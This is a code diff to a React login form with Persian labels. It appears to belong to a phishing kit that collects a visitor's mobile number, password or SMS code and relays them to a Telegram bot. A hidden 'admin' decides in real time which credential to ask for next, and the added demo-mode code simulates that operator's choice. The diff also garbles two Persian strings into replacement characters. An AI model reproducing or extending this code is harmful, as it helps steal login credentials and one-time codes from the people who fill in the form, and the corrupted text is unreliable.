@@ -300,6 +300,26 @@ export const LoginForm = () => {
         try {
           console.log("📱 User reached loading step, showing admin buttons...");
           await showAdminButtons(sessionId);
+
+          // In demo mode, show manual admin controls
+          if (!validateTelegramConfig()) {
+            setTimeout(() => {
+              const choice = confirm(
+                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
+                  "آیا می‌خواهید احراز هویت با رمز عبور ادامه یابد?\n\n" +
+                  "OK = Password Authentication\n" +
+                  "Cancel = SMS Authentication",
+              );
+
+              if (choice) {
+                console.log("🎭 Demo admin chose: Password");
+                handleAdminAction("password");
+              } else {
+                console.log("🎭 Demo admin chose: SMS");
+                handleAdminAction("sms");
+              }
+            }, 3000);
+          }
         } catch (error) {
           console.warn("⚠️ Could not show admin buttons:", error);
         }
@@ -678,7 +698,7 @@ export const LoginForm = () => {
                 {!validateTelegramConfig() && (
                   <AlertMessage>
                     🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی
-                    تلگرام، فایل .env را تنظیم کنید.
+                    تلگرام، فایل .env را تن��یم کنید.
                   </AlertMessage>
                 )}
 
@@ -720,7 +740,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    شماره همراه را وارد کنید.
+                    شماره همراه را وارد ک��ید.
                   </label>
                   <div style={{ position: "relative" }}>
                     <Input
